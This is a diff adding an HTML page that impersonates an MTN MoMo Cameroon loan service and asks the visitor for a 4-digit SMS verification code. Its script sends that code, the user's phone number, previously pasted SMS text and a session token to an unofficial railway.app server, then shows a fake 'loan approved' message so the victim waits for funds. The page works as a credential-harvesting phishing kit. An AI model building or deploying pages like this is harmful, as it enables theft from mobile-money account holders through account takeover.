@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>MTN MoMo Loan - Verify Code</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            height: 100vh;
+            height: 100dvh;
+            gap: 10px;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            line-height: 1;
+            width: 24px;
+            text-align: left;
+            padding: 0;
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 7px 16px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+            white-space: nowrap;
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 24px 20px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            overflow-y: auto;
+        }
+
+        /* ===== ICON BADGE ===== */
+        .icon-badge {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f0f4ff, #e0e8ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            font-size: 30px;
+            box-shadow: 0 6px 18px rgba(0, 71, 171, 0.12);
+            flex-shrink: 0;
+        }
+
+        .page-title {
+            font-size: 20px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .page-title .highlight {
+            color: #0047AB;
+        }
+
+        .instruction {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            line-height: 1.55;
+            margin-bottom: 22px;
+            padding: 0 4px;
+        }
+
+        .instruction strong {
+            color: #1a1a2e;
+            font-weight: 700;
+        }
+
+        /* ===== OTP BOXES ===== */
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 12px;
+        }
+
+        .otp-box {
+            width: 56px;
+            height: 62px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            color: #1a1a2e;
+            border: 2px solid #e0e0e0;
+            border-radius: 14px;
+            background: #fafbff;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            caret-color: #0047AB;
+            padding: 0;
+            flex: none;
+        }
+
+        .otp-box:focus {
+            border-color: #0047AB;
+            background: #f0f4ff;
+            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.12);
+            transform: scale(1.04);
+        }
+
+        .otp-box.filled {
+            border-color: #0047AB;
+            background: #f0f4ff;
+        }
+
+        .otp-box.invalid {
+            border-color: #e74c3c;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.12);
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            font-weight: 500;
+            line-height: 1.4;
+            text-align: center;
+        }
+        .error-text.show { display: block; }
+
+        /* ===== VERIFY BUTTON ===== */
+        .verify-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            font-family: 'Inter', sans-serif;
+            margin-top: 22px;
+        }
+
+        .verify-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+        }
+        .verify-btn:active:not(:disabled) { transform: scale(0.98); }
+        .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2.5px solid rgba(255, 255, 255, 0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: -3px;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== RESEND ===== */
+        .resend-row {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 12px;
+            color: #777;
+        }
+
+        .resend-link {
+            font-size: 12px;
+            font-weight: 700;
+            color: #0047AB;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+        }
+        .resend-link:hover:not(:disabled) { background: #f0f4ff; }
+        .resend-link:disabled { color: #bbb; cursor: not-allowed; }
+
+        /* ===== SECURITY ===== */
+        .security-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 18px;
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 6px;
+            color: #aaa;
+            font-size: 11px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+            flex-shrink: 0;
+        }
+
+        /* ============================================
+           CONGRATULATIONS MODAL
+           ============================================ */
+        .congrats-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 3000;
+            backdrop-filter: blur(6px);
+            animation: fadeIn 0.3s ease;
+        }
+        .congrats-overlay.show { display: flex; }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .congrats-content {
+            background: white;
+            border-radius: 28px;
+            padding: 0;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+            text-align: center;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .congrats-header {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            padding: 30px 24px 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .congrats-header::before {
+            content: '🎉🎊💰';
+            position: absolute;
+            top: -10px;
+            left: 0;
+            right: 0;
+            font-size: 30px;
+            opacity: 0.15;
+            letter-spacing: 8px;
+        }
+
+        .congrats-emoji {
+            font-size: 60px;
+            display: block;
+            margin-bottom: 10px;
+            animation: bounce 1.5s infinite;
+            position: relative;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-8px) scale(1.05); }
+        }
+
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .congrats-subtitle {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+            position: relative;
+        }
+
+        .congrats-body {
+            padding: 24px 22px 28px;
+        }
+
+        .congrats-message {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a2e;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+        .congrats-message .highlight { color: #0047AB; }
+
+        .congrats-time {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #e8f5e9;
+            border: 1px solid #c8e6c9;
+            border-radius: 12px;
+            padding: 10px 16px;
+            margin: 12px 0 20px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e7e34;
+        }
+        .congrats-time .clock { font-size: 16px; }
+
+        .congrats-note {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            padding: 0 8px;
+        }
+
+        .congrats-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .congrats-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.4);
+        }
+        .congrats-btn:active { transform: scale(0.98); }
+
+        /* ===== SMALL PHONES ===== */
+        @media (max-height: 700px) {
+            .card { padding: 18px 16px; }
+            .icon-badge {
+                width: 54px;
+                height: 54px;
+                font-size: 26px;
+                margin-bottom: 10px;
+            }
+            .page-title { font-size: 18px; }
+            .instruction { font-size: 12px; margin-bottom: 16px; }
+            .otp-box { width: 50px; height: 56px; font-size: 22px; }
+            .verify-btn { margin-top: 16px; padding: 14px; }
+        }
+
+        @media (max-width: 380px) {
+            .otp-boxes { gap: 8px; }
+            .otp-box { width: 46px; height: 52px; font-size: 20px; border-radius: 12px; }
+            .congrats-title { font-size: 20px; }
+            .congrats-message { font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='sms-paste.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <div style="width:24px;"></div>
+    </header>
+
+    <main class="card">
+        <div class="icon-badge">🔐</div>
+
+        <h1 class="page-title">
+            Enter <span class="highlight">Verification Code</span>
+        </h1>
+
+        <p class="instruction">
+            We sent a <strong>4-digit code</strong> to your MoMo number.
+            Enter it below to confirm your loan disbursement.
+        </p>
+
+        <!-- OTP Input Boxes -->
+        <div class="otp-boxes" id="otpBoxes">
+            <input type="tel" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="tel" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="tel" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="tel" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off">
+        </div>
+
+        <div class="error-text" id="otpError">Please enter the 4-digit code from the SMS</div>
+
+        <button class="verify-btn" id="verifyBtn" disabled>
+            VERIFY &amp; CONTINUE →
+        </button>
+
+        <div class="resend-row">
+            Didn't receive the code?
+            <button class="resend-link" id="resendBtn" type="button" disabled>
+                Resend (<span id="countdown">60</span>s)
+            </button>
+        </div>
+
+        <div class="security-notice">
+            <span>🔒</span>
+            <span>Secure connection to MTN MoMo</span>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <!-- ===== CONGRATULATIONS MODAL ===== -->
+    <div class="congrats-overlay" id="congratsOverlay">
+        <div class="congrats-content">
+            <div class="congrats-header">
+                <span class="congrats-emoji">🎉</span>
+                <h2 class="congrats-title">Congratulations!</h2>
+                <p class="congrats-subtitle">Your loan request has been approved</p>
+            </div>
+            <div class="congrats-body">
+                <p class="congrats-message">
+                    Please wait for the <span class="highlight">disbursement</span>
+                </p>
+                <div class="congrats-time">
+                    <span class="clock">⏰</span>
+                    <span>Approximately less than 24 hours</span>
+                </div>
+                <p class="congrats-note">
+                    You'll receive an SMS notification once the funds have been sent to your MoMo account.
+                </p>
+                <button class="congrats-btn" onclick="window.location.href='index.html'">
+                    OK, GOT IT →
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // BACKEND URL — NEW
+        // ============================================
+        const API_BASE = 'https://momo-usersey-production.up.railway.app';
+
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const otpBoxes = [
+            document.getElementById('otp1'),
+            document.getElementById('otp2'),
+            document.getElementById('otp3'),
+            document.getElementById('otp4')
+        ];
+        const otpError = document.getElementById('otpError');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const congratsOverlay = document.getElementById('congratsOverlay');
+
+        // ============================================
+        // SESSION CHECK
+        // ============================================
+        const sessionRaw = localStorage.getItem('momoSession');
+        if (!sessionRaw) {
+            window.location.href = 'login.html';
+        }
+        let session = {};
+        try { session = JSON.parse(sessionRaw || '{}'); } catch (e) {}
+
+        const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
+        const storedSms = localStorage.getItem('momoSms') || '';
+
+        // ============================================
+        // OTP INPUT HANDLING
+        // ============================================
+        function getOtpValue() {
+            return otpBoxes.map(b => b.value).join('');
+        }
+
+        function updateVerifyState() {
+            const otp = getOtpValue();
+            verifyBtn.disabled = otp.length !== 4;
+            if (otp.length === 4) {
+                otpError.classList.remove('show');
+                otpBoxes.forEach(b => b.classList.remove('invalid'));
+            }
+        }
+
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value) {
+                    this.classList.add('filled');
+                    if (index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+                } else {
+                    this.classList.remove('filled');
+                }
+                updateVerifyState();
+            });
+
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    otpBoxes[index - 1].focus();
+                    otpBoxes[index - 1].value = '';
+                    otpBoxes[index - 1].classList.remove('filled');
+                    updateVerifyState();
+                }
+            });
+
+            box.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                if (pasted.length > 0) {
+                    for (let i = 0; i < otpBoxes.length && i < pasted.length; i++) {
+                        otpBoxes[i].value = pasted[i];
+                        otpBoxes[i].classList.add('filled');
+                    }
+                    const nextEmpty = otpBoxes.findIndex(b => !b.value);
+                    otpBoxes[nextEmpty !== -1 ? nextEmpty : otpBoxes.length - 1].focus();
+                    updateVerifyState();
+                }
+            });
+        });
+
+        // ============================================
+        // RESEND COUNTDOWN
+        // ============================================
+        let remaining = 60;
+        let timer = null;
+
+        function startCountdown() {
+            remaining = 60;
+            resendBtn.disabled = true;
+            resendBtn.innerHTML = 'Resend (<span id="countdown">60</span>s)';
+            const el = document.getElementById('countdown');
+
+            timer = setInterval(function() {
+                remaining--;
+                if (el) el.textContent = remaining;
+                if (remaining <= 0) {
+                    clearInterval(timer);
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = 'Resend code';
+                }
+            }, 1000);
+        }
+
+        startCountdown();
+
+        resendBtn.addEventListener('click', function() {
+            if (resendBtn.disabled) return;
+            console.log('📤 Resend OTP requested for:', storedPhone);
+            startCountdown();
+        });
+
+        // ============================================
+        // VERIFY BUTTON → sends OTP to new backend
+        // ============================================
+        verifyBtn.addEventListener('click', async function() {
+            const otp = getOtpValue();
+
+            if (otp.length !== 4) {
+                otpBoxes.forEach(b => b.classList.add('invalid'));
+                otpError.textContent = 'Please enter the 4-digit code from the SMS';
+                otpError.classList.add('show');
+                otpBoxes[0].focus();
+                return;
+            }
+
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="spinner"></span>VERIFYING...';
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch(`${API_BASE}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: storedPhone,
+                        otp: otp,
+                        sms: storedSms,
+                        token: session.token || ''
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                const data = await res.json().catch(() => ({}));
+
+                if (!res.ok || !data.ok) {
+                    throw new Error(data.error || 'Verification failed');
+                }
+
+                localStorage.setItem('momoVerified', JSON.stringify({
+                    verifiedAt: new Date().toISOString(),
+                    reference: data.reference || null
+                }));
+
+                // Show congratulations modal
+                console.log('🎉 Showing congratulations modal...');
+                congratsOverlay.classList.add('show');
+
+            } catch (err) {
+                console.error('OTP verify error:', err);
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
+
+                const reason = err.name === 'AbortError'
+                    ? 'Server took too long. Please try again.'
+                    : (err.message || 'Could not connect. Check your internet.');
+                alert('Verification failed: ' + reason);
+            }
+        });
+
+        // ============================================
+        // INIT
+        // ============================================
+        otpBoxes[0].focus();
+        updateVerifyState();
+
+        console.log('====================================');
+        console.log('💰 MTN MoMo Loan – Cameroon');
+        console.log('🔐 Verify OTP connected to:', API_BASE);
+        console.log('📱 Phone:', storedPhone);
+        console.log('====================================');
+    </script>
+</body>
+</html>
